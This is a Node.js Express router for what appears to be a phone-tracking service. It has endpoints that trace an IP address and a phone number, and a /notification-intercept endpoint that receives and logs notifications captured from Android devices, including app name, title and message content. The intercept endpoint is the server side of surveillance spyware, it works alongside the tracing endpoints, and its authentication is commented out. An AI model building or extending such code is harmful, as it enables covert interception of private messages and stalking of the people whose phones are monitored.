const express = require('express');
const router = express.Router();
const { trackIP, tracePhoneNumber } = require('../services/osintService');
// Optional: Use authenticateToken if you have it in middleware
// const authenticateToken = require('../middleware/auth'); 

/**
 * @route POST /api/v1/tracking/ip
 * @desc Footprint an IP address (GhostTrack / Bat Toolkit module)
 */
router.post('/ip', async (req, res) => {
    try {
        const { ip } = req.body;
        if (!ip) return res.status(400).json({ error: "IP address required" });

        const result = await trackIP(ip);
        res.json(result);
    } catch (err) {
        res.status(500).json({ error: "OSINT service error" });
    }
});

/**
 * @route POST /api/v1/tracking/phone
 * @desc Footprint an MSISDN (GhostTrack module)
 */
router.post('/phone', async (req, res) => {
    try {
        const { msisdn } = req.body;
        if (!msisdn) return res.status(400).json({ error: "Phone number required" });

        const result = await tracePhoneNumber(msisdn);
        res.json(result);
    } catch (err) {
        res.status(500).json({ error: "OSINT service error" });
    }
});

/**
 * @route POST /api/v1/tracking/notification-intercept
 * @desc Receive intercepted notifications from Android clients (TrackPhoneAndroid)
 */
router.post('/notification-intercept', async (req, res) => {
    try {
        const { deviceId, packageName, title, content } = req.body;
        console.log(`[INTERCEPT] ${deviceId} - ${packageName}: ${title} -> ${content}`);

        // Save to DB...
        res.json({ success: true, message: "Intercept logged" });
    } catch (err) {
        res.status(500).json({ error: "Intercept handler error" });
    }
});

module.exports = router;
